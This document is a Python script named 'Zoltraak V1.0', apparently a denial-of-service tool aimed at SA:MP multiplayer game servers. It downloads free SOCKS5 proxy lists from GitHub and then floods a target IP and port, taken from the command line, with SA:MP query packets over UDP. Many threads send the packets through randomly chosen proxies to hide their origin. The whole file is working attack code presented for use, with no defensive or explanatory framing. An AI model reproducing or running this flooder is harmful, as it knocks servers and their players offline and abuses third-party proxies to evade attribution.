import requests
import threading
import socket
import socks
import random
import sys
import struct
import time

proxy_api_urls = [
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt"
]

proxies = set()
for url in proxy_api_urls:
    response = requests.get(url)
    proxies.update([proxy.lstrip("socks5://") for proxy in response.text.strip().replace('\r', '').split('\n')])

print("███████████████████████████")
print("███████▀▀▀░░░░░░░▀▀▀███████")
print("████▀░░░░░░░░░░░░░░░░░▀████")
print("███│░░░░░░░░░░░░░░░░░░░│███")
print("██▌│░░░░░░░░░░░░░░░░░░░│▐██")
print("██░└┐░░░░░░░░░░░░░░░░░┌┘░██")
print("██░░└┐░░░░░░░░░░░░░░░┌┘░░██")
print("██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██")
print("██▌░│██████▌░░░▐██████│░▐██")
print("███░│▐███▀▀░░▄░░▀▀███▌│░███")
print("██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██")
print("██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██")
print("████▄─┘██▌░░░░░░░▐██└─▄████")
print("█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████")
print("████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████")
print("█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████")
print("███████▄░░░░░░░░░░░▄███████")
print("██████████▄▄▄▄▄▄▄██████████")
print("███████Zoltraak V1.0███████")
print(f"█████████{len(proxies)} Proxy█████████")
print("███████Raknet SA:MP████████")
print("███████████████████████████")

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
times = int(sys.argv[3])
totalthread = int(sys.argv[4])
start_time = time.time()
payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'

blacklisted_proxies = set()

def create_proxied_socket(proxy_host, proxy_port):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
    s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
    return s

def worker():
    global blacklisted_proxies
    target = (target_ip, target_port)

    while time.time() - start_time < times:
        proxy = random.choice([p for p in proxies if p not in blacklisted_proxies])
        proxy_host, proxy_port = proxy.split(":")
        udp = create_proxied_socket(proxy_host, int(proxy_port))

        try:
            udp.sendto(payload, target)
        except Exception as error:
            blacklisted_proxies.add(proxy)
            break

while time.time() - start_time < times:
    while threading.active_count() >= totalthread:
        pass
    threading.Thread(target=worker).start()
